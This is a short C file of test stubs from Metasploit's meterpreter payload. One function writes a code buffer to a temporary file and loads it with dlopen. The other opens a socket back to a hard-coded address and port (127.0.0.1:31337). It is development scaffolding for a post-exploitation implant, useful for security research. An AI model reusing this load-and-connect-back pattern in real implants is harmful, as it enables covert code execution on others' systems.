/******************* STANDALONE SUPPORT FUNCTIONS ***************

These functions will be overridden by the meterpreter rtld
when linked in the metsrv context. They are here to allow us to test the
meterpreter functionality in a normal environment.

*****************************************************************/
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/errno.h>
#include <stdio.h>
#include <stdlib.h>

#include <netinet/in.h>

#include "dlfcn.h"
#ifdef __linux__
#include "sfsyscall.h"
#endif

#define PORT 	31337
#define	ADDR	"127.0.0.1"

void *
_dlopenbuf(const char *name, char *buffer, size_t length)
{
	const char *file;
	void *dl;

#if 0	
	if ((dl = dlopenbuf(name, 0444, buffer, length)) != NULL)
		return (dl);
#endif	
	if (buffer != NULL) {
		file = name != NULL ? name : "/tmp/foo";
		
		buffer_to_file(file, buffer, length);
	} else
		file = name;

	return dlopen(file, 0444);
}

int
_dlsocket(void)
{
	struct sockaddr_in s;
	int cli;
	in_addr_t addr;

#if 0	
	if ((cli = dlsocket()) != -1)
		return (cli);
#endif
	if ((cli = socket(AF_INET, SOCK_STREAM, 0)) < 0) 
		fprintf(stderr, "socket: %d\n", errno);
	    
	addr = inet_addr(ADDR);
	s.sin_family      = AF_INET;
	s.sin_port        = htons(PORT);
	s.sin_addr.s_addr = addr;
	printf("connecting to %s:%d...\n", ADDR, PORT);
	if (connect(cli, (struct sockaddr *)&s, sizeof(s)) != 0) { 
		perror("connect failed"); 
		exit(1); 
	} 
	return (cli);
}

/*******************************************************************/

	


